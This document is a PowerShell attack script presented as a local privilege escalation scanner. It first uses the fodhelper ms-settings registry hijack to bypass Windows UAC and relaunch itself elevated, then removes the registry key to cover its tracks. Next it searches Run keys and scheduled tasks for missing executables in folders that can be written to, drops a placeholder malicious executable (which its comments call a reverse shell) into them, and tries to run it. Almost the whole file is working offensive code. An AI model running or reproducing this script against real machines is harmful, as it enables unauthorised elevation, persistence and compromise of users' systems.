# Check if running as Admin
function Test-Admin {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

# If not Admin, Bypass UAC
if (-Not (Test-Admin)) {
    Write-Host "[!] Not running as Admin. Attempting UAC Bypass..." -ForegroundColor Yellow
    
    $payload = "powershell -NoP -Ep Bypass -File `"$PSCommandPath`""
    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    
    New-Item -Path "HKCU:\Software\Classes\ms-settings" -Force | Out-Null
    New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell" -Force | Out-Null
    New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Force | Out-Null
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(default)" -Value $payload
    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value ""

    Start-Process "C:\Windows\System32\fodhelper.exe"

    Start-Sleep 5  # Wait for UAC bypass

    Remove-Item -Path $regPath -Recurse -Force  # Clean up registry
    exit
}

Write-Host "[*] Running as Admin. Proceeding with LPE scan..." -ForegroundColor Green

# Define paths to scan
$autorunLocations = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
)

Write-Host "[*] Scanning for missing auto-start programs and scheduled binaries..." -ForegroundColor Cyan

# Function to check missing binaries & writable directories
function Check-MissingAndWritable {
    param ($exePath)

    $exePath = $exePath -replace '^"|"$', ''  # Remove quotes
    $exePath = $exePath -split '\s+' | Select-Object -First 1  # Remove extra arguments

    if ($exePath -match "^(.*?\.exe)$") {
        if (-Not (Test-Path $exePath)) {
            $folder = Split-Path $exePath -Parent
            if (Test-Path $folder) {
                # Check for writable permissions
                $permCheck = icacls $folder | Select-String "(Everyone|BUILTIN\\Users): (F|M|W)"
                if ($permCheck) {
                    Write-Host "[!] VULNERABLE: Missing EXE: $exePath | Writable: YES" -ForegroundColor Red

                    # Exploit: Drop a fake EXE (e.g., reverse shell)
                    $payloadPath = "$folder\exploit.exe"
                    Write-Host "[*] Dropping payload: $payloadPath" -ForegroundColor Yellow
                    Copy-Item "C:\path\to\your\malicious.exe" -Destination $payloadPath -Force

                    # Attempt execution if auto-run
                    if ($autorunLocations -contains $folder) {
                        Write-Host "[*] Attempting Execution..." -ForegroundColor Green
                        Start-Process $payloadPath
                    }
                } else {
                    Write-Host "[-] Missing EXE: $exePath | Writable: NO" -ForegroundColor Yellow
                }
            }
        }
    }
}

# Scan Auto-Start Programs
foreach ($location in $autorunLocations) {
    $entries = Get-ItemProperty -Path $location -ErrorAction SilentlyContinue
    foreach ($entry in $entries.PSObject.Properties) {
        Check-MissingAndWritable -exePath $entry.Value
    }
}

# Scan Scheduled Tasks
$tasks = Get-ScheduledTask | Where-Object { $_.Actions -match "\.exe" }
foreach ($task in $tasks) {
    $exePath = ($task.Actions | Select-Object -ExpandProperty Execute) -replace '^"|"$', ''
    Check-MissingAndWritable -exePath $exePath
}

Write-Host "[*] Scan Complete!" -ForegroundColor Cyan
